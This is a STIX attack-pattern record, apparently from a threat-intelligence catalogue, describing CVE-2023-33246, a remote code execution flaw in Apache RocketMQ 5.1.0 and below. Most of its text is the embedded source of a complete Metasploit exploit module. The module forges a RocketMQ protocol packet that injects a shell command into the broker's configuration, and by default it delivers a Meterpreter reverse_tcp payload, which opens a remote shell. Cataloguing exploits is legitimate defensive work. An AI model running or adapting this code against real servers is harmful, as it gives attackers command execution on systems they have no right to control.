{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bea7cbab-bfb6-460b-9745-60f79754442d",
    "created": "2024-08-14T17:09:42.090425Z",
    "modified": "2024-08-14T17:09:42.090429Z",
    "name": "Apache RocketMQ update config RCE",
    "description": " RocketMQ versions 5.1.0 and below are vulnerable to Arbitrary Code Injection. Broker component of RocketMQ is leaked on the extranet and lack permission verification. An attacker can exploit this vulnerability by using the update configuration function to execute commands as the system users that RocketMQ is running as. Additionally, an attacker can achieve the same effect by forging the RocketMQ protocol content. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/apache_rocketmq_update_config.rb",
            "external_id": "apache_rocketmq_update_config.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT#usage-examples"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-33246"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n  include Msf::Auxiliary::Rocketmq\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache RocketMQ update config RCE',\n        'Description' => %q{\n          RocketMQ versions 5.1.0 and below are vulnerable to Arbitrary Code Injection. Broker component of RocketMQ is\n          leaked on the extranet and lack permission verification. An attacker can exploit this vulnerability by using\n          the update configuration function to execute commands as the system users that RocketMQ is running as.\n          Additionally, an attacker can achieve the same effect by forging the RocketMQ protocol content.\n        },\n        'Author' => [\n          'Malayke', # PoC\n          'jheysel-r7',  # module - RCE portion\n          'h00die',      # module - Version detection & parsing\n        ],\n        'References' => [\n          [ 'URL', 'https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT#usage-examples'],\n          [ 'CVE', '2023-33246']\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => %w[unix linux],\n        'Privileged' => false,\n        'Arch' => [ ARCH_CMD ],\n        'Targets' => [\n          [\n            'Automatic (Unix In-Memory)',\n            {\n              'Platform' => %w[unix linux],\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/linux/http/x64/meterpreter/reverse_tcp' },\n              'Type' => :nix_memory\n            }\n          ],\n        ],\n        'Payload' => {\n          'BadChars' => \"\\x27\"\n        },\n        'DefaultOptions' => {\n          'WfsDelay' => 60\n        },\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2023-05-23',\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, CONFIG_CHANGES ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'The RocketMQ NameServer port', 9876]),\n        OptPort.new('BROKER_PORT', [false, 'The RocketMQ Broker port. If left unset the module will attempt to retrieve the Broker port from the NameServer response (recommended)', 10911])\n      ]\n    )\n  end\n\n  def check\n    @version_request_response = send_version_request\n    @parsed_data = parse_rocketmq_data(@version_request_response)\n    return Exploit::CheckCode::Unknown('RocketMQ did not respond to the request for version information') unless @parsed_data['version']\n\n    version = Rex::Version.new(@parsed_data['version'].gsub('V', ''))\n    return Exploit::CheckCode::Unknown('Unable to determine the version') unless version\n\n    if version > Rex::Version.new('5.0.0')\n      return Exploit::CheckCode::Appears(\"RocketMQ version: #{version}\") if version <= Rex::Version.new('5.1.0')\n    elsif version <= Rex::Version.new('4.9.5')\n      return Exploit::CheckCode::Appears(\"RocketMQ version: #{version}\")\n    end\n    Exploit::CheckCode::Safe(\"RocketMQ version: #{version}\")\n  end\n\n  def execute_command(cmd, opts = {})\n    data = '`{\"code\":25,\"flag\":0,\"language\":\"JAVA\",\"opaque\":0,\"serializeTypeCurrentRPC\":\"JSON\",\"version\":395}filterServerNums=1\nrocketmqHome=' + cmd.encode('UTF-8') + \"\\x3b\\x0a\"\n    header = [data.length + 3].pack('N') + \"\\x00\\x00\\x00\"\n    payload = header + data\n\n    begin\n      vprint_status(\"Payload command to be executed: #{cmd}\")\n      sock = connect(true, { 'RHOST' => datastore['RHOST'], 'RPORT' => opts[:broker_port].to_i })\n      vprint_status(\"Payload is #{data}\")\n      sock.put(payload)\n    rescue Rex::ConnectionError, ::Errno::ETIMEDOUT, ::Timeout::Error, ::EOFError => e\n      fail_with(Failure::Unreachable, \"Unable to connect: #{e.class} #{e.message}\")\n    end\n  end\n\n  def on_new_session(session)\n    print_status('Removing the payload from where it was injected into $ROCKETMQ_HOME. The FilterServerManager class will execute the payload every 30 seconds until this is reverted')\n\n    if session.type == 'meterpreter'\n      pwd = session.fs.dir.pwd\n    else\n      pwd = session.shell_command_token('pwd')\n    end\n\n    # The session returned by the exploit spawns inside $ROCKETMQ_HOME/bin\n    pwd.gsub!('/bin', '')\n    print_good(\"Determined the original $ROCKETMQ_HOME: #{pwd}\")\n    print_status('Re-running the exploit in order to reset the proper $ROCKETMQ_HOME value')\n\n    execute_command(pwd, { broker_port: @broker_port })\n  end\n\n  def exploit\n    @version_request_response ||= send_version_request\n    @parsed_data ||= parse_rocketmq_data(@version_request_response)\n    @broker_port = get_broker_port(@parsed_data, datastore['rhost'], default_broker_port: datastore['BROKER_PORT'])\n    print_status(\"Executing target: #{target.name} with payload #{datastore['PAYLOAD']} on Broker port: #{@broker_port}\")\n    execute_command(\"-c $@|sh . echo bash -c '#{payload.encoded}'\", { broker_port: @broker_port })\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-05-23",
    "x_mitre_platforms": [
        "%w[unix linux]"
    ]
}